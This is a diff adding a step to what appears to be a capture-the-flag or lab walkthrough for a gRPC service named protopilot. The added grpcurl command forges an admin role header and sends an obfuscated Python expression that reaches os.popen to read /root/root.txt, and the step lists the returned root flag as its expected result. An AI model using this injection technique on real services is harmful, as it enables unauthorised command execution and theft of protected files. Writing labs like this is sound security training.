@@ -31,6 +31,16 @@ grpcurl -plaintext -proto protopilot.proto \
   protopilot.AdminService.TestRule
 ```
 
+```bash
+grpcurl -plaintext -proto protopilot.proto \
+  -H 'x-user-role: admin' \
+  -d '{"expression":"getattr(helper.__globals__[\"o\"+\"s\"],\"p\"+\"o\"+\"pen\")(\"cat /r\"+\"oot/r\"+\"oot.txt\").__iter__().__next__()"}' \
+  localhost:50051 \
+  protopilot.AdminService.TestRule
+```
+
+Expected result: response includes the canonical root flag value from `/root/root.txt`.
+
 ## Reset
 
 ```bash
